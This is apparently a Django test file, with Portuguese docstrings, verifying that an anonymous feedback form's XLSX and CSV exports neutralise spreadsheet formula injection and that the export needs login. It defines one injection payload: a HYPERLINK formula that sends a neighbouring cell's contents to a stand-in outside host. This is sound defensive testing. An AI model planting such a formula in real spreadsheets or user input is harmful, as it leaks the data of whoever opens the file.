"""
A PLANILHA EXPORTADA NÃO PODE CARREGAR FÓRMULA DE ESTRANHO.

A fonte deste arquivo é única no sistema: texto livre de gente ANÔNIMA. O
formulário é público, sem login, o link não expira e aceita várias pessoas. Todo
outro exportador do BWA Tech é alimentado por dado que alguém autenticado
digitou; este não.

O Excel começa a ler uma FÓRMULA quando a célula começa com `=`, `+`, `-` ou `@`.
Sem tratamento, `=HYPERLINK("http://fora.tld/?d="&A2,"clique")` deixa de ser o
que a pessoa escreveu e vira fórmula viva no arquivo que — como diz a docstring
da própria view — "sai do sistema e passa a circular por e-mail e pendrive".

E o dano não precisa de má-fé para aparecer: um cliente que responde "-3 dias de
atraso" faz o gestor ver `#NAME?` no lugar do texto. O feedback foi colhido,
guardado, exportado — e ninguém consegue lê-lo.

POR QUE OS TESTES PASSAM PELA ROTA PÚBLICA em vez de gravar `RespostaFeedback`
direto: o ponto é justamente que a validação de entrada ACEITA esses caracteres
(e deve continuar aceitando — `-3 dias` é uma resposta legítima). Um teste que
inserisse no banco pularia a única parte que poderia, um dia, passar a filtrar, e
deixaria de avisar se alguém "resolvesse" o problema no lugar errado.
"""
from __future__ import annotations

import csv
import datetime as dt
import io

from django.contrib.auth import get_user_model
from django.core.cache import cache
from django.test import TestCase
from django.utils import timezone
from openpyxl import load_workbook

from apps.accounts.models import SetorCatalogo
from apps.projects.models import Card, CardStatus, Project, Sprint

from ._apoio_testes import resposta_valida
from .exportacao import exportar_csv, exportar_xlsx, previa
from .models import EstadoPedido, PedidoFeedback
from .tasks import liberar_pedidos_no_prazo

User = get_user_model()

# A carga: o `&A2` é o que torna isto mais que um susto — HYPERLINK monta o
# endereço com o conteúdo da célula VIZINHA, ou seja, exfiltra o resto da linha
# (nome do card, respondente, setor) para fora quando alguém clica.
ATAQUE = '=HYPERLINK("http://fora.tld/?d="&A2,"Clique aqui")'


class BaseExportacao(TestCase):
    """Uma entrega real, respondida pela rota anônima."""

    def setUp(self):
        cache.clear()
        self.user = User.objects.create_superuser(
            username='chefe', password='x' * 12, email='chefe@example.com')
        self.setor = SetorCatalogo.objects.create(codename='tec', nome='Tecnologia')
        agora = timezone.now()
        self.sprint = Sprint.objects.create(
            nome='Sprint 1', data_inicio=agora,
            fechamento_em=agora + dt.timedelta(days=7), duracao_dias=7,
            supervisor=self.user, setor=self.setor,
        )
        self.projeto = Project.objects.create(nome='Portal do cliente', sprint=self.sprint)
        self.card = Card.objects.create(
            nome='Tela de login', projeto=self.projeto, gerar_formulario_feedback=True)

        with self.captureOnCommitCallbacks(execute=True):
            self.card.status = CardStatus.FINALIZADO
            self.card.save()

        self.pedido = PedidoFeedback.objects.get()

    def responder(self, texto):
        """O caminho REAL: POST anônimo em `/api/feedback/<token>/`.

        Envelhece a `data_referencia` e roda a varredura de verdade em vez de
        escrever o estado à mão — é o mesmo fato que a task lê, então o pedido
        chega ao estado que aceita resposta pelo caminho do produto.
        """
        PedidoFeedback.objects.filter(pk=self.pedido.pk).update(
            data_referencia=timezone.localdate() - dt.timedelta(days=30))
        liberar_pedidos_no_prazo()
        self.pedido.refresh_from_db()
        self.assertEqual(self.pedido.estado, EstadoPedido.AGUARDANDO_RESPOSTA)

        self.client.logout()
        resposta = self.client.post(
            f'/api/feedback/{self.pedido.token}/',
            {'valores': resposta_valida(self.pedido.formulario.campos, texto)},
            content_type='application/json',
        )
        self.assertEqual(resposta.status_code, 201, resposta.content)


class FormulaNaPlanilhaTests(BaseExportacao):

    def test_o_texto_com_igual_sai_como_TEXTO_no_xlsx_e_nao_como_formula(self):
        self.responder(ATAQUE)

        planilha = load_workbook(io.BytesIO(exportar_xlsx().content))
        celulas = [c for linha in planilha.active.iter_rows() for c in linha]

        # `data_type == 'f'` é o Excel tratando a célula como fórmula. Nenhuma
        # célula deste arquivo pode estar nesse estado: não existe coluna
        # calculada aqui, tudo é dado transcrito.
        self.assertEqual([c.value for c in celulas if c.data_type == 'f'], [])

        # E o texto continua INTEIRO: a defesa não pode ser truncar ou reescrever
        # o que a pessoa respondeu — só declarar que aquilo é texto.
        self.assertIn(ATAQUE, [c.value for c in celulas])

    def test_o_csv_prefixa_so_o_que_e_arriscado_e_deixa_o_resto_intacto(self):
        self.responder(ATAQUE)

        conteudo = exportar_csv().content.decode('utf-8-sig')
        linhas = list(csv.reader(io.StringIO(conteudo), delimiter=';'))
        celulas = [c for linha in linhas for c in linha]

        # No CSV a defesa é o apóstrofo: o Excel reinterpreta o arquivo ao abrir
        # e aspas não o impedem de avaliar `=...`.
        self.assertIn(f"'{ATAQUE}", celulas)
        self.assertNotIn(ATAQUE, celulas)

        # E nada mais foi tocado: o nome do card não começa com caractere de
        # fórmula e tem de sair exatamente como está no banco.
        self.assertIn('Tela de login', celulas)

    def test_resposta_legitima_que_comeca_com_menos_continua_legivel(self):
        """O caso SEM atacante — o que faz a correção valer a pena no dia a dia.

        "-3 dias de atraso" é uma resposta comum e honesta. Sem tratamento ela
        vira `#NAME?` na tela do gestor, e o feedback colhido some sem que
        ninguém saiba que sumiu.
        """
        self.responder('-3 dias de atraso na homologação')

        planilha = load_workbook(io.BytesIO(exportar_xlsx().content))
        valores = [c.value for linha in planilha.active.iter_rows() for c in linha]

        self.assertIn('-3 dias de atraso na homologação', valores)

    def test_a_previa_mostra_o_texto_cru_que_a_pessoa_escreveu(self):
        """A prévia é HTML, não planilha: `=` ali é só um caractere.

        Levar o apóstrofo do CSV para a tela mostraria à pessoa um texto que
        ninguém digitou. A promessa da prévia é sobre QUAIS colunas e linhas
        saem no arquivo — não sobre o artifício com que cada formato declara
        que a célula é texto.
        """
        self.responder(ATAQUE)

        pagina = previa(0, 100)
        valores = [v for linha in pagina['rows'] for v in linha.values()]

        self.assertIn(ATAQUE, valores)
        self.assertNotIn(f"'{ATAQUE}", valores)


class PermissaoDaExportacaoTests(BaseExportacao):

    def test_sem_login_a_exportacao_e_recusada(self):
        """A rota pública é a de RESPONDER. Ler o acervo inteiro não é pública."""
        self.client.logout()

        for url in ('/api/feedbacks/exportar/?formato=xlsx',
                    '/api/feedbacks/exportar/previa/'):
            with self.subTest(url=url):
                self.assertIn(self.client.get(url).status_code, (401, 403))
